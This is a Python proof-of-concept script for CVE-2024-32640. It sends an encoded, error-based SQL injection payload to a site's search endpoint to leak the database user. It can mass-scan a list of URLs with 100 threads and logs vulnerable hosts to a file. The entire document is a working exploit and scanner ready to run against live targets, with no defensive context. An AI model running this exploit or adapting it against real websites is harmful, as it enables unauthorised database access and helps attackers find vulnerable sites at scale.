import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"}
    payload = '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
    try:
        res1 = requests.get(target+payload,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
            re1 = re.findall("~(.*?)~",res2.text,re.S)
            if re1[0]!=None:
                print(f'[+]存在漏洞：{target}')
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                return False
    except Exception as e:
        return False
        


if __name__ == '__main__':
    main()